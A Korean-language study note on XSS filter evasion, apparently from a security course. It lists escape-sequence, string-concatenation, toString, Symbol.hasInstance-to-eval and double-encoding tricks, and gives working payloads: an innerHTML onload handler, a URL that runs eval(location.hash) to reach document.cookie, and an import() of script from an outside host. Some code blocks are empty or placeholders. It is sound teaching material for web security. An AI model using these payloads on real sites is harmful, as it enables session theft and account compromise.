## 불충분한 XSS 필터링
### 자바 스크립트 함수 및 키워드 필터링
#### 자바스크립트는 unicode escape sequence 지원
```js
var foo = "\u0063ookie";  // cookie
var bar = "cooki\x65";  // \x65는 \u0065와 같다.. cookie
\u0061lert(document.cookie);  // alert(document.cookie)
```
#### Computed member Access 지원
```js
document["coo"+"kie"] == document["cookie"] == document.cookie
```
#### Computed member access 통한 우회
```js
alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)
window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)
```
#### 다양한 우회 예시
|구문|대체 구문|
|--|--|
|alert, XMLHttpRequest 등 문서 최상위 객체 및 함수|window['al'+'ert'], window['XMLHtt'+'pRequest'] 등 이름 끊어서 쓰기|
|window|self, this|
|eval(code)|Function(code)()|
|Function|isNaN['constr'+'uctor'] 등 함수의 constructor 속성 접근|

#### 템플릿 리터릴(Template Literals) 사용
따옴표("",')가 필터링되어 있는 경우 백틱(`),${}표현식 사용하여 선언 가능
```js

```

#### 기본 내장 함수나 객체의 문자를 사용하는 방법    
내장 함수나 객체를 toString 함수를 이용해 문자열로 변경하게 되면 함수나 객체의 형태가 문자열로 변환 됨.
```js
var baz = history.toString()[8] + // "H"
(history+[])[9] + // "i"
(URL+0)[12] + // "("
(URL+0)[13]; // ")" ==> "Hi()"
```
- history.toString() 은 "[object History]" 문자열을 반환
- URL.toString()은 "function URL() { [native code] }" 문자열 반환
- history+[]; history+0; 처럼 함수나 객체와 +, - 와 같은 산술 연산을 수행하게 되면 연산을 위해 객체 내부적으로 toString 함수를 호출해 문자열로 변환한 후에 연산을 수행

#### Symbol.hasInstance 오버라이딩
ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용 가능

Symbol.hasInstance : 객체의 instanceof 연산자 동작을 사용자 가 오버라이드할 수 있게 해 줌.
```js
class MyArray {
    static [Symbol.hasInstance](instance) {
        return Array.isArray(instance); //Array 인지를 체크
    }
}

console.log([] instanceof MyArray); // true
console.log([1, 2, 3] instanceof MyArray); // true
console.log({} instanceof MyArray); // false
```
- O instanceof C를 연산할 때 C에 Symbol.hasInstance 속성에 함수가 있을 경우 메소드로 호출하여 instanceof 연산자의 결과 값으로 사용
-  이 특성을 이용해 instanceof를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있음.

```js
"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};

Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
```

이 때 innerHTML로 HTML 코드를 실행할 때에는 보안 상 `<script>`태그를 삽입해도 실행되지 않으므로 이벤트 핸들러를 이용해 자바스크립트 코드를 실행해야 함
```js

document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
```

#### 디코딩 전 필터링
입력 검증은 디코딩 등의 모든 전처리 작업을 마치고 수행해야 하며 검증이 끝난 데이터를 디코딩하여 사용해서는 안 됨.    

예시    
공격자(Attacker)가 게시글에 공격 코드 `<script>`(이하 생략)를 포함하여 게시판에 올리고, 희생자(Victim)가 해당 글을 읽는 시나리오    
1. 공격자가 더블 URL 인코딩한 공격 코드 %253Cscript%253E(이하 생략)를 포함하여 게시글 업로드를 요청
2. 웹 방화벽이 해당 데이터를 디코딩 후 검증합니다. 디코딩한 결과인 %3Cscript%3E(이하 생략)는 안전하다고 판단하여 차단하지 않고 애플리케이션에 전달
3. 애플리케이션이 해당 데이터를 또 디코딩해서 `<script>`(이하 생략)를 게시판 DB에 저장합니다. (검증 후 디코딩 발생!)️
4. 희생자가 해당 게시글을 읽으면 XSS가 발생하여 악성 자바스크립트 코드가 실행 됨

```js
let x = 1;
```

#### location.hash
웹 브라우저에서 사용되는 JavaScript의 window.location 객체의 속성 중 하나로 URL의 해시 (#) 부분을 나타냄. 해시는 URL의 특정 섹션을 가리키는 데 주로 사용되며, 주로 웹 페이지 내의 앵커나 SPA(Single Page Application)의 상태 관리에 사용 됨
```js
//location.hash : 현재 URL의 해시 값을 가져옴.
console.log(location.hash); // 예: "#section1"

//해시 값을 변경하면 페이지는 새로고침되지 않지만, 변경된 해시 값은 브라우저의 히스토리에 저장. 뒤로 가기하면 이전 해시 상태로 돌아감
location.hash = "section2";

//해시 변경 감지: 해시 값이 변경되면 "hashchange" 이벤트가 발생
window.addEventListener("hashchange", function() {
  console.log("Hash value changed to:", location.hash);
});
```


#### 길이 제한
- 삽입할 수 있는 코드의 길이가 제한되어 있는 경우, 다른 경로로 실행할 추가적인 코드 (payload)를 URL fragment 등으로 삽입 후 삽입 지점에는 본 코드를 실행하는 짧은 코드 (launcher)를 사용 가능
- Fragment로 스크립트를 넘겨준 후 XSS 지점에서 location.hash 로 URL의 Fragment 부분을 추출하여 eval()로 실행하는 기법이 흔히 쓰임
- 그 외에도 쿠키에 페이로드를 저장하는 방식과 import 와 같은 외부 자원을 스크립트로 로드하는 방법 또한 사용 가능    

location.hash 를 이용한 공격 방식
```
hash값 가져와 eval로 실행
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
```

```js
import("http://malice.dreamhack.io");
```
```js
var e = document.createElement('script')
```
